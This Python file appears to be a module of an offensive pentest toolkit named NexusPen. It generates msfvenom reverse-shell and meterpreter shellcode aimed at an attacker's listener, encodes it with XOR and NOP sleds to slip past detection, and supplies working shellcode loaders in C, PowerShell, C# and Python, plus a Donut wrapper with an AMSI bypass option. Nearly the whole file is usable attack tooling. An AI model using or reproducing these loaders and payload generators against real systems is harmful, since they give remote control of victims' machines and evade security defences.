#!/usr/bin/env python3
"""
NexusPen - Shellcode Generator Module
======================================
Shellcode generation and encoding.
"""

import subprocess
import base64
import struct
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class Shellcode:
    """Generated shellcode."""
    name: str
    raw: bytes
    format: str
    size: int
    architecture: str
    platform: str


class ShellcodeGenerator:
    """
    Generate shellcode using msfvenom.
    """
    
    # Common payload templates
    PAYLOADS = {
        'windows': {
            'reverse_tcp': 'windows/meterpreter/reverse_tcp',
            'reverse_https': 'windows/meterpreter/reverse_https',
            'shell_reverse_tcp': 'windows/shell_reverse_tcp',
            'exec': 'windows/exec',
            'messagebox': 'windows/messagebox',
            'adduser': 'windows/adduser',
        },
        'windows_x64': {
            'reverse_tcp': 'windows/x64/meterpreter/reverse_tcp',
            'reverse_https': 'windows/x64/meterpreter/reverse_https',
            'shell_reverse_tcp': 'windows/x64/shell_reverse_tcp',
            'exec': 'windows/x64/exec',
        },
        'linux': {
            'reverse_tcp': 'linux/x86/meterpreter/reverse_tcp',
            'shell_reverse_tcp': 'linux/x86/shell_reverse_tcp',
            'exec': 'linux/x86/exec',
            'shell_bind_tcp': 'linux/x86/shell_bind_tcp',
        },
        'linux_x64': {
            'reverse_tcp': 'linux/x64/meterpreter/reverse_tcp',
            'shell_reverse_tcp': 'linux/x64/shell_reverse_tcp',
            'exec': 'linux/x64/exec',
        },
    }
    
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
    
    def generate(self, payload: str, format: str = 'raw',
                encoder: str = None, iterations: int = 1,
                bad_chars: str = None) -> Optional[Shellcode]:
        """
        Generate shellcode using msfvenom.
        
        Args:
            payload: Metasploit payload name
            format: Output format (raw, c, python, csharp, etc.)
            encoder: Encoder to use (e.g., x86/shikata_ga_nai)
            iterations: Encoding iterations
            bad_chars: Bad characters to avoid (e.g., "\\x00\\x0a\\x0d")
        """
        console.print(f"\n[cyan]üîß Generating shellcode: {payload}[/cyan]")
        
        cmd = [
            'msfvenom',
            '-p', payload,
            f'LHOST={self.lhost}',
            f'LPORT={self.lport}',
            '-f', format,
        ]
        
        if encoder:
            cmd.extend(['-e', encoder])
            cmd.extend(['-i', str(iterations)])
        
        if bad_chars:
            cmd.extend(['-b', bad_chars])
        
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            
            if result.returncode == 0:
                shellcode = Shellcode(
                    name=payload,
                    raw=result.stdout,
                    format=format,
                    size=len(result.stdout),
                    architecture='x86' if 'x64' not in payload else 'x64',
                    platform='windows' if 'windows' in payload else 'linux'
                )
                
                console.print(f"[green]‚úì Generated {shellcode.size} bytes[/green]")
                return shellcode
            else:
                console.print(f"[red]Error: {result.stderr.decode()}[/red]")
                
        except FileNotFoundError:
            console.print("[red]msfvenom not found[/red]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return None
    
    def windows_reverse_tcp(self, format: str = 'c', arch: str = 'x86') -> Optional[Shellcode]:
        """Generate Windows reverse TCP shellcode."""
        payload = self.PAYLOADS['windows_x64' if arch == 'x64' else 'windows']['reverse_tcp']
        return self.generate(payload, format)
    
    def linux_reverse_tcp(self, format: str = 'c', arch: str = 'x86') -> Optional[Shellcode]:
        """Generate Linux reverse TCP shellcode."""
        payload = self.PAYLOADS['linux_x64' if arch == 'x64' else 'linux']['reverse_tcp']
        return self.generate(payload, format)
    
    def list_formats(self) -> List[str]:
        """List available output formats."""
        try:
            result = subprocess.run(['msfvenom', '--list', 'formats'],
                                   capture_output=True, text=True)
            return result.stdout.split('\n')
        except:
            return ['raw', 'c', 'python', 'csharp', 'powershell', 'ruby', 'hex']
    
    def list_encoders(self) -> List[str]:
        """List available encoders."""
        try:
            result = subprocess.run(['msfvenom', '--list', 'encoders'],
                                   capture_output=True, text=True)
            return result.stdout.split('\n')
        except:
            return ['x86/shikata_ga_nai', 'x86/jmp_call_additive', 'x64/xor']


class ShellcodeEncoder:
    """
    Shellcode encoding and obfuscation.
    """
    
    @staticmethod
    def xor_encode(shellcode: bytes, key: int = 0xAA) -> bytes:
        """XOR encode shellcode."""
        return bytes([b ^ key for b in shellcode])
    
    @staticmethod
    def xor_key_encode(shellcode: bytes, key: bytes) -> bytes:
        """XOR encode with multi-byte key."""
        result = []
        for i, b in enumerate(shellcode):
            result.append(b ^ key[i % len(key)])
        return bytes(result)
    
    @staticmethod
    def base64_encode(shellcode: bytes) -> str:
        """Base64 encode shellcode."""
        return base64.b64encode(shellcode).decode()
    
    @staticmethod
    def to_c_array(shellcode: bytes, var_name: str = 'buf') -> str:
        """Convert to C array format."""
        hex_bytes = ''.join(f'\\x{b:02x}' for b in shellcode)
        return f'unsigned char {var_name}[] = "{hex_bytes}";'
    
    @staticmethod
    def to_python_array(shellcode: bytes, var_name: str = 'buf') -> str:
        """Convert to Python byte array format."""
        hex_bytes = ''.join(f'\\x{b:02x}' for b in shellcode)
        return f'{var_name} = b"{hex_bytes}"'
    
    @staticmethod
    def to_csharp_array(shellcode: bytes, var_name: str = 'buf') -> str:
        """Convert to C# byte array format."""
        hex_bytes = ','.join(f'0x{b:02x}' for b in shellcode)
        return f'byte[] {var_name} = new byte[{len(shellcode)}] {{{hex_bytes}}};'
    
    @staticmethod
    def to_powershell(shellcode: bytes, var_name: str = 'buf') -> str:
        """Convert to PowerShell format."""
        hex_bytes = ','.join(f'0x{b:02x}' for b in shellcode)
        return f'[Byte[]] ${var_name} = {hex_bytes}'
    
    @staticmethod
    def insert_nops(shellcode: bytes, count: int = 10, position: str = 'start') -> bytes:
        """Insert NOP sled."""
        nops = b'\x90' * count
        if position == 'start':
            return nops + shellcode
        else:
            return shellcode + nops
    
    @staticmethod
    def add_null_free(shellcode: bytes) -> bytes:
        """Attempt to remove null bytes via XOR encoding."""
        # Find a key that doesn't produce null bytes
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in shellcode])
            if b'\x00' not in encoded:
                return encoded
        return shellcode


class ShellcodeInjector:
    """
    Shellcode injection techniques (code templates).
    """
    
    @staticmethod
    def c_process_injection() -> str:
        """Return C code for process injection."""
        return '''
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "SHELLCODE_HERE";

int main() {
    PVOID exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
'''
    
    @staticmethod
    def powershell_injection() -> str:
        """Return PowerShell code for shellcode injection."""
        return '''
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
'

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf = SHELLCODE_HERE

$size = $buf.Length
[IntPtr]$addr = $winFunc::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$handle = $winFunc::CreateThread(0, 0, $addr, 0, 0, 0)
'''
    
    @staticmethod
    def csharp_injection() -> str:
        """Return C# code for shellcode injection."""
        return '''
using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main() {
        byte[] buf = new byte[] { SHELLCODE_HERE };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.ReadLine();
    }
}
'''
    
    @staticmethod
    def python_injection_linux() -> str:
        """Return Python code for Linux shellcode injection."""
        return '''
import ctypes
import mmap

shellcode = b"SHELLCODE_HERE"

# Allocate executable memory
mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(shellcode)

# Get function pointer
cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)
func = ctypes.cast(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mem))), cfunc)
func()
'''


class DonutGenerator:
    """
    Donut shellcode generator integration.
    Converts .NET assemblies to position-independent shellcode.
    """
    
    @staticmethod
    def generate(input_file: str, output_file: str = None,
                arch: int = 3, bypass: int = 3) -> Optional[str]:
        """
        Generate shellcode from .NET assembly using Donut.
        
        Args:
            input_file: Input .NET assembly (.exe or .dll)
            output_file: Output file for shellcode
            arch: Architecture (1=x86, 2=x64, 3=both)
            bypass: AMSI/WLDP bypass (1=none, 2=abort, 3=continue)
        """
        console.print(f"\n[cyan]üç© Generating Donut shellcode from {input_file}[/cyan]")
        
        output_file = output_file or '/tmp/donut_shellcode.bin'
        
        cmd = [
            'donut',
            '-i', input_file,
            '-o', output_file,
            '-a', str(arch),
            '-b', str(bypass),
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                console.print(f"[green]‚úì Shellcode saved to {output_file}[/green]")
                return output_file
            else:
                console.print(f"[red]Error: {result.stderr}[/red]")
                
        except FileNotFoundError:
            console.print("[red]donut not found[/red]")
        
        return None
